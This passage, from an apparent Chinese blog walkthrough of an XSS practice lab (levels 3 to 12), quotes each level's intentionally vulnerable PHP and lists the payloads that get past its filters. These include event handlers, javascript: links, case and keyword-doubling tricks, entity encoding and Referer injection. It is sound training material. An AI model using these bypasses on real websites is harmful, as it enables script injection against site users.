class=\"line\">&lt;/center&gt;&#x27;;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828140717307.png\" alt=\"image-20200828140717307\"></p>\n<h5 id=\"挑战三\"><a href=\"#挑战三\" class=\"headerlink\" title=\"挑战三\"></a>挑战三</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//闭合测试，发现&gt;被转义了</span><br><span class=\"line\">`&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200828142634784.png\" alt=\"image-20200828142634784\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//不使用&lt;等类似字符进行测试</span><br><span class=\"line\">`&#x27;onmouseover=alert(1)//`</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//对变量经过两次htmlspecialchars函数过滤</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\">str = <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;keyword&quot;</span>];</span></span><br><span class=\"line\">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;</span><br><span class=\"line\">&lt;form action=level3.php method=GET&gt;</span><br><span class=\"line\">&lt;input name=keyword  value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt;</span><br><span class=\"line\">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;/center&gt;&quot;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828143012943.png\" alt=\"image-20200828143012943\"></p>\n<h5 id=\"挑战四\"><a href=\"#挑战四\" class=\"headerlink\" title=\"挑战四\"></a>挑战四</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//基础测试，发现对&lt;、&gt;进行替换为空</span><br><span class=\"line\">`&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200828143756092.png\" alt=\"image-20200828143756092\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//不使用&lt;等类似字符进行测试</span><br><span class=\"line\">`&quot;onmouseover=alert(1)//`</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;对输入变量值中&lt;、&gt;进行替换</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class=\"line\">$str2&#x3D;str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</span><br><span class=\"line\">$str3&#x3D;str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</span><br><span class=\"line\">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class=\"line\">&lt;form action&#x3D;level4.php method&#x3D;GET&gt;</span><br><span class=\"line\">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str3.&#39;&quot;&gt;</span><br><span class=\"line\">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class=\"line\">&lt;&#x2F;form&gt;</span><br><span class=\"line\">&lt;&#x2F;center&gt;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828144232008.png\" alt=\"image-20200828144232008\"></p>\n<h5 id=\"挑战五\"><a href=\"#挑战五\" class=\"headerlink\" title=\"挑战五\"></a>挑战五</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//基础测试，发现对&lt;、&gt;进行替换为空</span><br><span class=\"line\">`&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200828150406623.png\" alt=\"image-20200828150406623\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;&lt;script 转换成 &lt;scr_ipt ，on转换成 o_n</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class=\"line\">$str2&#x3D;str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class=\"line\">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class=\"line\">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class=\"line\">&lt;form action&#x3D;level5.php method&#x3D;GET&gt;</span><br><span class=\"line\">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str3.&#39;&quot;&gt;</span><br><span class=\"line\">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class=\"line\">&lt;&#x2F;form&gt;</span><br><span class=\"line\">&lt;&#x2F;center&gt;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//使用伪协议绕过</span><br><span class=\"line\">`&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828151240091.png\" alt=\"image-20200828151240091\"></p>\n<h5 id=\"挑战六\"><a href=\"#挑战六\" class=\"headerlink\" title=\"挑战六\"></a>挑战六</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//使用伪协议绕过</span><br><span class=\"line\">`&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200828151906636.png\" alt=\"image-20200828151906636\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;发现添加了多个属性进行过滤操作</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class=\"line\">$str2&#x3D;str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class=\"line\">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class=\"line\">$str4&#x3D;str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class=\"line\">$str5&#x3D;str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class=\"line\">$str6&#x3D;str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class=\"line\">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class=\"line\">&lt;form action&#x3D;level6.php method&#x3D;GET&gt;</span><br><span class=\"line\">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str6.&#39;&quot;&gt;</span><br><span class=\"line\">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class=\"line\">&lt;&#x2F;form&gt;</span><br><span class=\"line\">&lt;&#x2F;center&gt;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//发现并未对大小写过滤，</span><br><span class=\"line\">`&quot;&gt; &lt;a HrEf=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828152455501.png\" alt=\"image-20200828152455501\"></p>\n<h5 id=\"挑战七\"><a href=\"#挑战七\" class=\"headerlink\" title=\"挑战七\"></a>挑战七</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//使用大小写测试</span><br><span class=\"line\">`&quot;&gt; &lt;a HrEf=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200828152734820.png\" alt=\"image-20200828152734820\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;添加script替换为空</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">$str &#x3D;strtolower( $_GET[&quot;keyword&quot;]);</span><br><span class=\"line\">$str2&#x3D;str_replace(&quot;script&quot;,&quot;&quot;,$str);</span><br><span class=\"line\">$str3&#x3D;str_replace(&quot;on&quot;,&quot;&quot;,$str2);</span><br><span class=\"line\">$str4&#x3D;str_replace(&quot;src&quot;,&quot;&quot;,$str3);</span><br><span class=\"line\">$str5&#x3D;str_replace(&quot;data&quot;,&quot;&quot;,$str4);</span><br><span class=\"line\">$str6&#x3D;str_replace(&quot;href&quot;,&quot;&quot;,$str5);</span><br><span class=\"line\">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class=\"line\">&lt;form action&#x3D;level7.php method&#x3D;GET&gt;</span><br><span class=\"line\">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str6.&#39;&quot;&gt;</span><br><span class=\"line\">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class=\"line\">&lt;&#x2F;form&gt;</span><br><span class=\"line\">&lt;&#x2F;center&gt;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//重复绕过,</span><br><span class=\"line\">`&quot;&gt;&lt;sscriptcript&gt;alert(1)&lt;/sscriptcript&gt;`</span><br><span class=\"line\">`&quot;oonnmouseover=alert(1)`</span><br><span class=\"line\">`&quot;&gt;&lt;a hrhrefef=javascriscriptpt:alert(1)&gt;click&lt;/a&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828153152250.png\" alt=\"image-20200828153152250\"></p>\n<h5 id=\"挑战八\"><a href=\"#挑战八\" class=\"headerlink\" title=\"挑战八\"></a>挑战八</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//重复测试</span><br><span class=\"line\">`&quot;&gt;&lt;sscriptcript&gt;alert(1)&lt;/sscriptcript&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200828153930815.png\" alt=\"image-20200828153930815\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;在上面基础上添加了大小写过滤、属性中双引号被转换成HTML实体，无法截断属性，可以使用协议绕过javascript:alert，由于script关键字被过滤，</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class=\"line\">$str2&#x3D;str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class=\"line\">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class=\"line\">$str4&#x3D;str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class=\"line\">$str5&#x3D;str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class=\"line\">$str6&#x3D;str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class=\"line\">$str7&#x3D;str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);</span><br><span class=\"line\">echo &#39;&lt;center&gt;</span><br><span class=\"line\">&lt;form action&#x3D;level8.php method&#x3D;GET&gt;</span><br><span class=\"line\">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;</span><br><span class=\"line\">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;添加友情链接 &#x2F;&gt;</span><br><span class=\"line\">&lt;&#x2F;form&gt;</span><br><span class=\"line\">&lt;&#x2F;center&gt;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://www.qqxiuzi.cn/bianma/zifushiti.php\">在线实体编码</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//实体编码，javascript会被替换成javasc_rpt，我们使用&amp;#x72来代替r ,HTML字符实体转换：</span><br><span class=\"line\">`javascrip&amp;#x74;:alert(1)`</span><br><span class=\"line\">`javascript:%61lert(1)`</span><br><span class=\"line\">`javasc&amp;#x72;ipt:alert`1``</span><br><span class=\"line\">`javasc&amp;#x0072;ipt:alert`1``</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828154518631.png\" alt=\"image-20200828154518631\"></p>\n<h5 id=\"挑战九\"><a href=\"#挑战九\" class=\"headerlink\" title=\"挑战九\"></a>挑战九</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//实体编码测试</span><br><span class=\"line\">`javascrip&amp;#x74;:alert(1)`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200828154756855.png\" alt=\"image-20200828154756855\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;在之前基础上，添加的链接是http:&#x2F;&#x2F;头信息</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class=\"line\">$str2&#x3D;str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class=\"line\">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class=\"line\">$str4&#x3D;str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class=\"line\">$str5&#x3D;str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class=\"line\">$str6&#x3D;str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class=\"line\">$str7&#x3D;str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);</span><br><span class=\"line\">echo &#39;&lt;center&gt;</span><br><span class=\"line\">&lt;form action&#x3D;level9.php method&#x3D;GET&gt;</span><br><span class=\"line\">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;</span><br><span class=\"line\">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;添加友情链接 &#x2F;&gt;</span><br><span class=\"line\">&lt;&#x2F;form&gt;</span><br><span class=\"line\">&lt;&#x2F;center&gt;&#39;;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">if(false&#x3D;&#x3D;&#x3D;strpos($str7,&#39;http:&#x2F;&#x2F;&#39;))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#39;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">else</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#39;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//添加http://信息</span><br><span class=\"line\">`javascrip&amp;#x74;:alert(1)//http://xxx.com ` //利用注释</span><br><span class=\"line\">`javascrip&amp;#x74;:%0dhttp://xxx.com%0dalert(1) ` //不利用注释</span><br><span class=\"line\">`javascrip&amp;#x74;:%0ahttp://xxx.com%0daalert(1)`  //不利用注释</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828155322234.png\" alt=\"image-20200828155322234\"></p>\n<h5 id=\"挑战十\"><a href=\"#挑战十\" class=\"headerlink\" title=\"挑战十\"></a>挑战十</h5><p>发现一个隐藏输入框</p>\n<p><img src=\"/images/XSS/image-20200828155806918.png\" alt=\"image-20200828155806918\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;多了个参数、多了一个输入框且已经隐藏、并对&lt;、&gt;括号进行过滤，htmlspecialchars函数过滤</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class=\"line\">$str11 &#x3D; $_GET[&quot;t_sort&quot;];</span><br><span class=\"line\">$str22&#x3D;str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class=\"line\">$str33&#x3D;str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class=\"line\">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class=\"line\">&lt;form id&#x3D;search&gt;</span><br><span class=\"line\">&lt;input name&#x3D;&quot;t_link&quot;  value&#x3D;&quot;&#39;.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class=\"line\">&lt;input name&#x3D;&quot;t_history&quot;  value&#x3D;&quot;&#39;.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class=\"line\">&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot;&#39;.$str33.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class=\"line\">&lt;&#x2F;form&gt;</span><br><span class=\"line\">&lt;&#x2F;center&gt;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//添加参数并构造PoC</span><br><span class=\"line\">`keyword = test&amp;t_sort=&quot;type=&quot;text&quot; onclick = &quot;alert(1)`</span><br><span class=\"line\">`keyword = test&amp;t_sort=&quot;type=&quot;text&quot; onmouseover=&quot;alert(1)`</span><br><span class=\"line\">`keyword = test&amp;t_sort=&quot;type=&quot;text&quot; onmouseover=alert`1``</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828160245970.png\" alt=\"image-20200828160245970\"></p>\n<h5 id=\"挑战十一\"><a href=\"#挑战十一\" class=\"headerlink\" title=\"挑战十一\"></a>挑战十一</h5><p>之前测试发现无效果，查看源码</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//比之前多了个请求头REFERER进行指定来源</span></span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(<span class=\"string\">&quot;display_errors&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">$str = $_GET[<span class=\"string\">&quot;keyword&quot;</span>];</span><br><span class=\"line\">$str00 = $_GET[<span class=\"string\">&quot;t_sort&quot;</span>];</span><br><span class=\"line\">$str11=$_SERVER[<span class=\"string\">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class=\"line\">$str22=str_replace(<span class=\"string\">&quot;&gt;&quot;</span>,<span class=\"string\">&quot;&quot;</span>,$str11);</span><br><span class=\"line\">$str33=str_replace(<span class=\"string\">&quot;&lt;&quot;</span>,<span class=\"string\">&quot;&quot;</span>,$str22);</span><br><span class=\"line\">echo <span class=\"string\">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class=\"string\">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class=\"string\">&#x27;&lt;center&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;form id=search&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class=\"string\">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class=\"string\">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars($str00).<span class=\"string\">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.$str33.<span class=\"string\">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/form&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/center&gt;&#x27;</span>;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//修改请求头并修改一下PoC代码</span><br><span class=\"line\">`Referer: &quot; onmouseover=alert(1) type=&quot;text&quot;`</span><br><span class=\"line\">`Referer: &quot; onclick=&quot;alert(1) type=&quot;text&quot;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200828161500548.png\" alt=\"image-20200828161500548\"></p>\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828161534239.png\" alt=\"image-20200828161534239\"></p>\n<h5 id=\"挑战十二\"><a href=\"#挑战十二\" class=\"headerlink\" title=\"挑战十二\"></a>挑战十二</h5><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span 